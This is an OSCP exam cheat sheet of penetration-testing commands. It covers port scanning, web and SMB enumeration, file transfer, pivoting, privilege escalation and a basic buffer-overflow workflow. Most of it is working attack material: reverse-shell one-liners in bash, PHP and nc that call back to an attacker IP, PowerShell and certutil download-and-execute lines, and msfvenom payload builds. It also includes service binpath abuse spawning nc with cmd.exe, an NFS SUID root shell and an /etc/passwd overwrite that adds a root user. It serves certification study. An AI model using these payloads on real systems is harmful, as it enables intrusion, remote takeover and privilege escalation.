# Hacking-OSCP_cheatsheet
OSCP_cheatsheet

<h2 id=enumeration>Enumeration</h2><h3 id=network-discoverie>Network discoverie</h3><h4 id=nmap>Nmap</h4><p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p><pre><code class=language-console data-lang=console>nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports
</code></pre><p>Is also possible to specify scripts or ports:</p><pre><code class=language-console data-lang=console>nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
</code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p><pre><code class=language-console data-lang=console>nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
</code></pre><h3 id=ports-discovery-without-nmap>Ports discovery (without nmap)</h3><h4 id=nc--bash>nc + bash</h4><p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>; <span style=color:#66d9ef>for</span> i in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span> nc -w <span style=color:#ae81ff>1</span> 192.168.30.253 $i <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is closed or filtered&#34;</span>; <span style=color:#66d9ef>done</span>
</code></pre></div><h4 id=devtcpipport-or-devudpipport>/dev/tcp/ip/port or /dev/udp/ip/port</h4><p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>; <span style=color:#66d9ef>for</span> i in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span> <span style=color:#f92672>(</span>echo &gt; /dev/tcp/192.168.30.253/<span style=color:#e6db74>&#34;</span>$i<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> &gt; /dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is closed&#34;</span>; <span style=color:#66d9ef>done</span>
</code></pre></div><p>Taking these last examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>subnet<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;192.168.30&#34;</span>
top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>
<span style=color:#66d9ef>for</span> host in <span style=color:#f92672>{</span>1..255<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
    <span style=color:#66d9ef>for</span> port in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span>
        <span style=color:#f92672>(</span>echo &gt; /dev/tcp/<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> &gt; /dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Host </span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74> has </span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74> open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Host </span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74> has </span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74> closed&#34;</span>
    <span style=color:#66d9ef>done</span>
<span style=color:#66d9ef>done</span>
</code></pre></div><h3 id=banner-grabbing-without-nmap>Banner grabbing (without nmap)</h3><p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p><h4 id=devtcpipport-or-devudpipport-1>/dev/tcp/ip/port or /dev/udp/ip/port</h4><pre><code class=language-console data-lang=console>cat &lt; /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><p>For doing it with udp ports is the same, but changing tcp for udp</p><h4 id=telnet>telnet</h4><pre><code class=language-console data-lang=console>telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><h3 id=web-directoriefile-scanner>Web directorie/file scanner</h3><h4 id=gobuster>Gobuster</h4><p>Scan all the directories/files by extension:</p><pre><code class=language-console data-lang=console>gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
</code></pre><p>For scanning without extensions, just take out the -x</p><h4 id=nikto>Nikto</h4><p>Sometimes Nikto shows juicy information, I tend to run it like:</p><pre><code class=language-console data-lang=console>nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
</code></pre><h4 id=fuff>fuff</h4><p>Web fuzzer, <a href=https://github.com/ffuf/ffuf>you can get fuff here</a>, it basically bruteforces the dirs.</p><pre><code class=language-console data-lang=console>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
</code></pre><h3 id=most-usefull-dictionaries-oscphtb>Most usefull dictionaries (OSCP/HTB)</h3><pre><code class=language-console data-lang=console>/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/wfuzz/others/common_pass.txt

In seclists-pkg:

/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</code></pre><h3 id=samba>Samba</h3><h4 id=smbclient>smbclient</h4><p>Check if there is anonymous login enabled:</p><pre><code class=language-console data-lang=console>smbclient -L 192.168.24.24
</code></pre><h4 id=impacket>impacket</h4><p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.</p><pre><code class=language-console data-lang=console>
/usr/share/doc/python3-impacket/examples/smbclient.py &quot;&quot;@192.168.24.24
</code></pre><h4 id=smbmap>smbmap</h4><p>Check which permissions we have in those shares (if there are):</p><pre><code class=language-console data-lang=console>smbmap -H 192.168.24.24
Or having an user:
smbmap -u ceso -H 192.168.24.24
</code></pre><h4 id=version-nmap-didnt-detect-it>Version (nmap didn&rsquo;t detect it)</h4><p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p><img src=https://ceso.github.io/images/cheatsheet/smb-version-wireshark.png class=center style=border-radius:8px><h2 id=exfiltration>Exfiltration</h2><h3 id=samba-1>Samba</h3><p>Generate a samba server with Impacket:</p><pre><code class=language-console data-lang=console>impacket-smbserver tools /home/kali/tools
</code></pre><h4 id=mount-in-windows>Mount in Windows</h4><p>Mounting it in Windows with Powershell:</p><pre><code class=language-console data-lang=console>New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
</code></pre><p>Mounting it without Powershell:</p><pre><code class=language-console data-lang=console>net use z: \\192.168.42.42\tools&quot;
</code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p><pre><code class=language-console data-lang=console>Powershell: Get-SMBShare
Without Powershell: net share
</code></pre><h4 id=mount-in-linux>Mount in Linux</h4><p>Is needed to have installed cifs-utils, to install it (in debian based):</p><pre><code class=language-console data-lang=console>sudo apt-get install cifs-utils
</code></pre><p>To mount it:</p><pre><code class=language-console data-lang=console>sudo mount -t cifs //192.168.42.42/tools ~/my_share/
</code></pre><p>To list mounted shares:</p><pre><code class=language-console data-lang=console>mount | grep cifs
grep cifs /proc/mount

</code></pre><h3 id=http>HTTP</h3><p>From your local attacker machine, create a http server with:</p><pre><code class=language-console data-lang=console>sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
</code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p><pre><code class=language-console data-lang=console>sudo python3 -m http.server 80 --dir /home/kali/tools
</code></pre><h4 id=windows>Windows</h4><pre><code class=language-console data-lang=console>iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
IWR -Uri &quot;http://192.168.42.42/n64.exe&quot; -Outfile &quot;n64.exe&quot;
</code></pre><h4 id=linux>Linux</h4><pre><code class=language-console data-lang=console>curl http://192.168.42.42/evil.php --output evil.php
</code></pre><h3 id=ftp>FTP</h3><p>If there is an ftp server which we have access, we can upload files there through it, the "" is the same for both, windows or linux:</p><pre><code class=language-console data-lang=console>Connect and login with:

ftp 192.168.42.42

Upload the files with:

put evil.py

Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:

pass

followed by enter
</code></pre><h3 id=sockets>Sockets</h3><p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
Create the socket with:</p><pre><code class=language-console data-lang=console>Attacker:
  nc -lvnp 443 &lt; evil.php

For both cases from windows, the only difference is to write nc.exe

Victim:
  nc -v 192.168.42.42 443 &gt; evil.php
</code></pre><h3 id=rdp>RDP</h3><p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p><pre><code class=language-console data-lang=console>rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
</code></pre><h2 id=pivoting>Pivoting</h2><p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p><h3 id=sshuttle>sshuttle</h3><h4 id=one-hop>One hop</h4><p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p><pre><code class=language-console data-lang=console>sshuttle ceso@192.168.20.35 192.168.30.0/24
</code></pre><h4 id=multi-hops>Multi-hops</h4><p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&mldr;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):</p><img src=https://ceso.github.io/images/cheatsheet/multiple-hop-sshuttle.png class=center style=border-radius:8px><p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p><pre><code class=language-console data-lang=console>Host fw.example.mgmt
  Hostname 192.168.20.35
  User userOnFw
  IdentityFile ~/.ssh/priv_key_fw
Host foreman.example.mgmt
  Hostname 192.168.30.40
  User root
  ProxyJump fw.example.mgmt
  IdentityFile ~/.ssh/priv_key_internal
</code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p><pre><code class=language-console data-lang=console>sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;

Later on is possible to connect from the local machine:
ssh foo@192.168.25.74
</code></pre><h2 id=reverse-shells>Reverse shells</h2><h3 id=php>php</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> $sock <span style=color:#f92672>=</span> <span style=color:#a6e22e>fsockopen</span>(<span style=color:#e6db74>&#34;192.168.42.42&#34;</span>,<span style=color:#e6db74>&#34;443&#34;</span>); $proc <span style=color:#f92672>=</span> <span style=color:#a6e22e>proc_open</span>(<span style=color:#e6db74>&#34;/bin/sh -i&#34;</span>, <span style=color:#66d9ef>array</span>(<span style=color:#ae81ff>0</span><span style=color:#f92672>=&gt;</span>$sock, <span style=color:#ae81ff>1</span><span style=color:#f92672>=&gt;</span>$sock, <span style=color:#ae81ff>2</span><span style=color:#f92672>=&gt;</span>$sock), $pipes); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>php</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>r</span> <span style=color:#e6db74>&#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</code></pre></div><h3 id=bash>bash</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style=color:#ae81ff>1</span>
</code></pre></div><h3 id=sh--nc>sh + nc</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style=color:#ae81ff>1</span> | nc 192.168.42.42 <span style=color:#ae81ff>443</span> &gt;/tmp/f
</code></pre></div><h3 id=perl-example-deploy-as-cgi-bin>Perl (example deploy as cgi-bin)</h3><pre><code class=language-console data-lang=console>msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
</code></pre><h3 id=java-example-to-deploy-on-tomcat>Java (example to deploy on tomcat)</h3><pre><code class=language-console data-lang=console>msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
</code></pre><h3 id=windows-htpp-download-reverse-shell>Windows HTPP download reverse shell</h3><pre><code class=language-console data-lang=console>msfvenom -a x86 --platform windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&quot;&quot; -e x86/unicode_mixed BufferRegister=EAX -f python
</code></pre><h3 id=windows-staged-reverse-tcp>Windows staged reverse TCP</h3><pre><code class=language-console data-lang=console> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
</code></pre><h3 id=windows-stageless-reverse-tcp>Windows stageless reverse TCP</h3><pre><code class=language-console data-lang=console>msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
</code></pre><h3 id=linux-staged-reverse-tcp>Linux staged reverse TCP</h3><pre><code class=language-console data-lang=console>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h3 id=linux-staged-reverse-tcp-1>Linux staged reverse TCP</h3><pre><code class=language-console data-lang=console>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h2 id=privilege-escalation>Privilege escalation</h2><h3 id=windows-1>Windows</h3><h4 id=run-as>Run-As</h4><pre><code class=language-console data-lang=console>PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
PS C:\&gt; $username = &quot;&lt;domain&gt;\&lt;user&gt;&quot;
PS C:\&gt; $password = '&lt;password&gt;'
PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
PS C:\&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\&gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://&lt;ip/host&gt;:&lt;port&gt;/path/to/file.evil') } -Credential $cred -Computer localhost
-----------------------------------------------------------------------------------------------------
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
</code></pre><h4 id=incorrect-permisions-in-services-sc-config-binpath>Incorrect permisions in services (sc config binpath)</h4><p>Binpath is set as running <code>cmd.exe</code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to <code>cmd.exe</code> remains):</p><pre><code class=language-console data-lang=console>sc config upnphost binpath= &quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&quot; 
</code></pre><h4 id=sam--system--security>SAM + SYSTEM + Security</h4><p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:</p><pre><code class=language-console data-lang=console>/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL

sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre><h3 id=linux-1>Linux</h3><h4 id=homeuseropenssl-ep-empty-capabilities>/home/user/openssl =ep (empty capabilities)</h4><p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p><pre><code class=language-console data-lang=console>cp /etc/passwd /tmp/passwd.orig
cp /etc/passwd /tmp/passwd.custom
</code></pre><p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with <code>customPassword</code> and as root user (UID = GID = 0):</p><pre><code class=language-console data-lang=console>echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
</code></pre><p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p><pre><code class=language-console data-lang=console>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre><p>Encrypt the new custom passwd:</p><pre><code class=language-console data-lang=console>openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
</code></pre><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p><pre><code class=language-console data-lang=console>cd /
/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
</code></pre><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p><pre><code class=language-console data-lang=console>su - ceso
</code></pre><h4 id=command-web-injection-add-user>Command web injection: add user</h4><pre><code class=language-console data-lang=console>/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
</code></pre><h4 id=nfs-no_root_squashinsecurerw>NFS; no_root_squash,insecure,rw</h4><p>If <code>/etc/exports</code> has a line like:</p><pre><code class=language-console data-lang=console>/srv/pelota 192.168.42.0/24(insecure,rw)
/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
</code></pre><p>NFS is being exported and you and you have ssh access to the machine.
From your attacker machine <strong>while logged as root</strong> user run:</p><pre><code class=language-console data-lang=console>ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
mount -t nfs 127.0.0.1:/srv/pelota my_share
cd my_share
cat &gt; shell.c&lt;&lt;EOF
#include &lt;unistd.h&gt;
int main(){
  setuid(0);
  setgid(0);
  system(&quot;/bin/bash&quot;);
}
EOF
gcc shell.c -o shell
chmod u+s shell
</code></pre><p>Now from inside a SSH session on the victim machine (in this example <code>192.168.42.32</code>):</p><pre><code class=language-console data-lang=console>bash-4.2$ cd /srv/pelota
bash-4.2$ ./shell
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre><h2 id=good-to-know-either-windows-andor-linux>Good to know (either Windows and/or Linux)</h2><h3 id=arch-cross-compile-exploit-and-diff-glibc-version>Arch cross compile exploit (and diff glibc version)</h3><pre><code class=language-console data-lang=console>gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
</code></pre><h3 id=ip-restriction-at-application-level-bypass>IP restriction at application level, bypass</h3><p>Try to send a request modifying the HTTP header by adding:</p><pre><code class=language-console data-lang=console>X-Forwarder-For: &lt;ip allowed&gt;
</code></pre><h3 id=windows---check-os-information>Windows - check OS information</h3><pre><code class=language-console data-lang=console>systeminfo
ver
</code></pre><h3 id=windows---check-architecture>Windows - check architecture</h3><pre><code class=language-console data-lang=console>wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
</code></pre><h3 id=powershell--running-as-32-or-64-bits>Powershell running as 32 or 64 bits</h3><pre><code class=language-console data-lang=console>[Environment]::Is64BitProcess   
</code></pre><h3 id=linux-lfi---intesresting-files-to-look-after>Linux LFI - intesresting files to look after</h3><pre><code class=language-console data-lang=console>/proc/self/status
/proc/self/environ
/etc/passwd
/etc/hosts
/etc/exports
</code></pre><h2 id=simple-buffer-overflow-32-bits-no-aslr-and-no-dep>Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</h2><h3 id=summarized-steps>Summarized steps</h3><ul><li>0 - Crash the application</li><li>1 - Fuzzing (find aprox number of bytes where the crash took place)</li><li>2 - Find offset</li><li>3 - EIP control</li><li>4 - Check for enough space on buffer</li><li>5 - Badchars counting</li><li>6 - Find return address (JMP ESP)</li><li>7 - Create payload</li></ul><h3 id=fuzzing-example-with-vulnserver--spike-on-trun-command>Fuzzing: example with vulnserver + spike on TRUN command</h3><pre><code class=language-console data-lang=console>cat &gt; trun.spk &lt;&lt;EOF
s_readline();
s_string(&quot;TRUN &quot;);
s_string_variable(&quot;COMMAND&quot;);
EOF
</code></pre><p>Now, start wireshark filtering on the target IP/PORT below and run the <code>trun.spk</code>:</p><pre><code class=language-console data-lang=console>generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
</code></pre><p>Once a crash takes place, go to wireshark to locate the crash.</p><h3 id=badchars>Badchars</h3><p>From the block below, the next ones were not included (most common badchars):</p><pre><code class=language-console data-lang=console>\x00 --&gt; null byte
\x0a --&gt; new line character (AKA &quot;\n&quot;)
</code></pre><p>So&mldr;actual list of badchars:</p><pre><code class=language-console data-lang=console>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
</code></pre><h3 id=usefull-tools-on-kali-linux>Usefull tools (on Kali Linux)</h3><h4 id=create_pattern>create_pattern</h4><pre><code class=language-console data-lang=console>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/bin/msf-pattern_create
</code></pre><h4 id=pattern_offset>pattern_offset</h4><pre><code class=language-console data-lang=console>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
/usr/bin/msf-pattern_offset
</code></pre><h4 id=nasm_shell>nasm_shell</h4><pre><code class=language-console data-lang=console>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/bin/msf-nasm_shell
</code></pre><h4 id=msfvenom>msfvenom</h4><pre><code class=language-console data-lang=console>/usr/share/metasploit-framework/msfvenom
/usr/bin/msfvenom
</code></pre><h3 id=shellcode-poc-calcexe>Shellcode POC: calc.exe</h3><pre><code class=language-console data-lang=console>msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
</code></pre></div>
